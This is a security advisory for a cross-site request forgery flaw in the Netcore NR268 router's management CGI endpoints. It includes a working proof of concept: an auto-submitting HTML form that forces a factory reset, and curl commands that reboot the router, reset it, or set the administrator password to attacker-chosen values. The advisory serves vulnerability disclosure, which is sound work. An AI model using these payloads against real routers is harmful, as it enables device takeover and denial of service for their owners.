# Netcore NR268 Cross-Site Request Forgery on Privileged Management CGI Actions

**Vendor:** Netcore  
**Product:** NR268 Router  
**Affected Version:** NR268-V1.7.121109.bin  
**Vulnerability Type:** Cross-Site Request Forgery (CWE-352)  
**Credits:** Zhou Ao, Zhang Yu, Yang Yang, Liu Xin @Nebusec

## Summary

Privileged CGI actions on NR268 are protected only by HTTP Basic authentication and have no anti-CSRF defense. Reboot, factory reset, administrator credential change, and management-port changes accept cross-site POST requests without checking Origin, Referer, or a CSRF token. Because browsers automatically attach cached Basic-auth credentials, a hostile page can submit `/router/RestoreDefault.cgi`, `/router/reboot.cgi`, or `/router/UserPassSet.cgi` in the administrator's authenticated context, and the password-change path does not require the current password.

## Technical Details

Boa authenticates the request with HTTP Basic authentication and then dispatches the CGI. The handlers read business parameters with `get_form_value()` and apply the change immediately. The shared frontend helper is a plain `$.post` / `DataRequest` wrapper and never attaches a CSRF token, nonce, Origin, or Referer check.

Because browsers automatically attach cached Basic-auth credentials to same-host requests, a hostile page can drive these actions in the administrator's authenticated context. `UserPassSet.cgi` does not require the current password.

### Affected Endpoint

- URL: `/router/RestoreDefault.cgi`, `/router/reboot.cgi`, `/router/UserPassSet.cgi`, `/router/WebPortSet.cgi`, `/router/WebRemotePortSet.cgi`
- Parameters: business fields only; no CSRF token
- Method: POST
- Authentication: victim browser sends cached HTTP Basic credentials

## Proof of Concept

Save the following page on an attacker origin and open it while the administrator is authenticated to the router:

```html
<html>
  <body onload="document.forms[0].submit()">
    <form method="POST" action="http://192.168.1.1/router/RestoreDefault.cgi">
      <input type="hidden" name="noneed" value="noneed">
    </form>
  </body>
</html>
```

Equivalent direct requests, still with no CSRF token:

```bash
curl -s -u admin:admin -X POST "http://192.168.1.1/router/RestoreDefault.cgi" -d "noneed=noneed"
curl -s -u admin:admin -X POST "http://192.168.1.1/router/reboot.cgi" -d "noneed=noneed"
curl -s -u admin:admin -X POST "http://192.168.1.1/router/UserPassSet.cgi" \
  -d "new_user_name=attacker&password1=AttackerPass1&password2=AttackerPass1"
```

### Outcome

The router accepts and processes the request. There is no CSRF token, Origin check, or Referer check. Factory reset, reboot, and administrator password change succeed from another web origin.

## Impact

- **Confidentiality:** Medium
- **Integrity:** High – factory reset, credential takeover, management-port changes
- **Availability:** High – reboot and restore-to-default deny service

A victim administrator who visits a hostile page can be forced into privileged state changes on the router.
